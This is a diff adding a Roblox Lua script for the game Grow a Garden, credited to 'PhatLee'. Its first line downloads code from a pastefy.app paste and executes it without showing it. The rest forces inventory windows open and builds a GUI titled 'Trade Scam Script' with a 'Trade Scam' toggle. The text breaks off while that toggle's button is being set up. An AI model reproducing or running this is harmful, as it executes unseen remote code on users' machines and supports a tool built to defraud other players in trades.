@@ -1,0 +1,112 @@
+loadstring(game:HttpGet("https://pastefy.app/aDXsZ6k2/raw"))()
+
+--backpack
+
+-- 📌 Script bật lại túi đồ trong Grow a Garden (LocalScript)
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+while true do
+	for _, gui in pairs(PlayerGui:GetChildren()) do
+		if gui:IsA("ScreenGui") and gui.Name:lower():find("inventory") then
+			gui.Enabled = true
+		end
+	end
+	wait(2)
+end
+
+--scripts
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+
+-- GUI Setup
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "TradeScamGUI"
+ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 220, 0, 100)
+MainFrame.Position = UDim2.new(0.5, -110, 0.5, -50)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
+Instance.new("UIStroke", MainFrame).Color = Color3.fromRGB(60, 60, 60)
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Parent = MainFrame
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "Trade Scam Script"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 18
+
+-- Footer
+local Footer = Instance.new("TextLabel")
+Footer.Parent = MainFrame
+Footer.Size = UDim2.new(1, 0, 0, 16)
+Footer.Position = UDim2.new(0, 0, 1, -16)
+Footer.Text = "--Script By PhatLee--"
+Footer.TextColor3 = Color3.fromRGB(150, 150, 150)
+Footer.BackgroundTransparency = 1
+Footer.Font = Enum.Font.Gotham
+Footer.TextSize = 11
+
+-- Inner Frame
+local InnerFrame = Instance.new("Frame")
+InnerFrame.Parent = MainFrame
+InnerFrame.Size = UDim2.new(0, 180, 0, 50)
+InnerFrame.Position = UDim2.new(0.5, -90, 0.5, -25)
+InnerFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+InnerFrame.BorderSizePixel = 0
+Instance.new("UICorner", InnerFrame).CornerRadius = UDim.new(0, 8)
+
+-- Label
+local Label = Instance.new("TextLabel")
+Label.Parent = InnerFrame
+Label.Size = UDim2.new(1, -60, 1, 0)
+Label.Position = UDim2.new(0, 10, 0, 0)
+Label.Text = "Trade Scam"
+Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+Label.BackgroundTransparency = 1
+Label.Font = Enum.Font.GothamMedium
+Label.TextSize = 16
+Label.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Toggle Background (container)
+local ToggleFrame = Instance.new("Frame")
+ToggleFrame.Parent = InnerFrame
+ToggleFrame.Size = UDim2.new(0, 46, 0, 22)
+ToggleFrame.Position = UDim2.new(1, -56, 0.5, -11)
+ToggleFrame.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+ToggleFrame.BorderSizePixel = 0
+Instance.new("UICorner", ToggleFrame).CornerRadius = UDim.new(1, 0)
+
+-- Knob
+local Knob = Instance.new("Frame")
+Knob.Parent = ToggleFrame
+Knob.Size = UDim2.new(0, 18, 0, 18)
+Knob.Position = UDim2.new(0, 2, 0, 2)
+Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Knob.BorderSizePixel = 0
+Instance.new("UICorner", Knob).CornerRadius = UDim.new(1, 0)
+
+-- Transparent Click Button
+local ClickButton = Instance.new("TextButton")
+ClickButton.Parent = ToggleFrame
+ClickButton.BackgroundTransparency = 1
+ClickButton.Size = UDim2.new(1, 0, 1, 0)
+ClickButton.Text = ""
